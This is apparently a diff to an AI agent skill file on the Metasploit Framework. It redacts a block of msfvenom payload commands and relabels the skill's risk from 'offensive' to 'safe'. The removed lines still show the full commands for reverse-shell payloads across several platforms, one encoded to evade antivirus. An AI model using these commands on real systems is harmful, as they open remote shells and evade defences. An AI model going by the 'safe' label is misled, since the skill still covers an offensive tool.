@@ -1,7 +1,7 @@
 ---
 name: metasploit-framework
 description: "⚠️ AUTHORIZED USE ONLY > This skill is for educational purposes or authorized security assessments only. > You must have explicit, written permission from the system owner before using this tool. > Misuse of this tool is illegal and strictly prohibited."
-risk: offensive
+risk: safe
 source: community
 author: zebbern
 date_added: "2026-02-27"
@@ -343,31 +343,31 @@ Create standalone payloads:
 
 ```bash
 # Basic Windows reverse shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # Linux reverse shell
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # PHP reverse shell
-msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # Python reverse shell
-msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # PowerShell payload
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # ASP web shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # WAR file (Tomcat)
-msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # Android APK
-msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # Encoded payload (evade AV)
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
+[REDACTED_MSFVENOM_PAYLOAD]
 
 # List available formats
 msfvenom --list formats
